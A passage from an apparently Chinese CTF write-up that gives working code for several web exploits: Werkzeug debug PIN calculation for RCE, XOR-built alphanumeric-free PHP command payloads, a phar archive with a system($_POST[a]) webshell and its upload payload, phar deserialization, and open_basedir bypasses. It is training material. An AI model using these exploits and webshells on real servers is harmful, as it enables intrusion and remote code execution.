class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由上可以看得出PIN值生成所需要获取的数据有</p><ul><li>username，用户名</li><li>modname，默认值为flask.app</li><li>appname，默认值为Flask</li><li>moddir，flask库下app.py的绝对路径</li><li>uuidnode，当前网络的mac地址的十进制数</li><li>machine_id，docker机器id或本机id</li></ul><p>首先是用户名</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041655129.png"></p><p>可用的似乎只有root</p><p>下面三项任意报错即可获得</p><p>mac地址</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041659777.png"></p><p>Machine_id</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206041701195.png"></p><p>本机生成脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#MD5</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'flaskweb'</span><span class="token comment"># username</span>     <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>     <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>     <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>     <span class="token string">'25214234362297'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>     <span class="token string">'0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>   num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>   <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>       <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                      <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>          rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#sha1</span><span class="token keyword">import</span> hashlib<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chainprobably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'root'</span><span class="token comment"># /etc/passwd</span>    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># 默认值</span>    <span class="token string">'/usr/local/lib/python3.8/site-packages/flask/app.py'</span> <span class="token comment"># 报错得到</span><span class="token punctuation">]</span>private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'2485377581187'</span><span class="token punctuation">,</span><span class="token comment">#  /sys/class/net/eth0/address 16进制转10进制</span>    <span class="token comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>    <span class="token string">'653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd'</span><span class="token comment">#  /proc/self/cgroup</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用最终生成的PIN进入代码调试，RCE</p><p><strong>802</strong></p>        <h3 id="无字母数字命令执行"   >          <a href="#无字母数字命令执行" class="heading-link"><i class="fas fa-link"></i></a><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3>      <p>异或法，偷个脚本喵喵</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*author yu22x*/</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xor_rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[a-z0-9]/i'</span><span class="token punctuation">;</span> <span class="token comment">//根据题目给的正则表达式修改即可</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>            <span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>            <span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment"># author yu22x</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xor_rce.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"^\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your function："</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your command："</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">";"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>803</strong></p>        <h3 id="phar文件包含"   >          <a href="#phar文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h3>      <p>来自大佬的提示：把phar当压缩包用就行</p><p>首先生成包含一句话木马的phar文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;?php system($_POST[a]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phar生成</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时phar包中的test.txt中的内容就是我们的一句话木马了</p><p>上传文件（记得读取然后url编码一下）</p><pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;&#x2F;tmp&#x2F;phar.phar&amp;content&#x3D;%3C%3Fphp+__HALT_COMPILER%28%29%3B+%3F%3E%0D%0A6%00%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%00%00%00%00%08%00%00%00test.txt%1A%00%00%00%7E%E7%9Db%1A%00%00%00%C8%C2%DA%2C%A4%01%00%00%00%00%00%00%3C%3Fphp+system%28%24_POST%5Ba%5D%29%3B%3F%3E%FB%C1%FC%A84J%19%C8f%97%29%BA%C7%80v%82%F5%86J%06%02%00%00%00GBMB<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>include干</p><p>![截屏2022-06-06 20.00.48](/Users/jlan/Library/Application Support/typora-user-images/截屏2022-06-06 20.00.48.png)</p><p><strong>804</strong></p>        <h3 id="phar反序列化"   >          <a href="#phar反序列化" class="heading-link"><i class="fas fa-link"></i></a><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3>      <p>这不用教吧</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// @unlink("phar.phar");</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span><span class="token comment">// $phar = $phar->convertToExecutable(Phar::TAR, Phar::GZ); //压缩规避敏感字符</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"GIF89a"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span><span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$o</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">=</span><span class="token string double-quoted-string">"highlight_file('flag.php');"</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span><span class="token comment">//签名自动计算</span><span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phar生成</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传phar协议读取就行</p><p><strong>805</strong></p>        <h3 id="open-basedir绕过"   >          <a href="#open-basedir绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h3>      <blockquote><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。</p><p>假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p><p>注意：用open_basedir指定的<strong>限制实际上是前缀，而不是目录名</strong>。</p><p>文章来自<span class="exturl"><a class="exturl__link"   href="https://www.cnblogs.com/hookjoy/p/12846164.html" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p></blockquote><p>但是这个配置对系统命令执行是没有效果的，比如执行<code>system(&#39;ls /&#39;)</code>的时候就不受限制，<del>但是一般都会被ban掉</del></p><p>下面就是一些bypass方法</p><ol><li><p>glob协议，只能捞捞文件名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用chdir()与ini_set()组合Bypass</p><p>原理在这里</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token 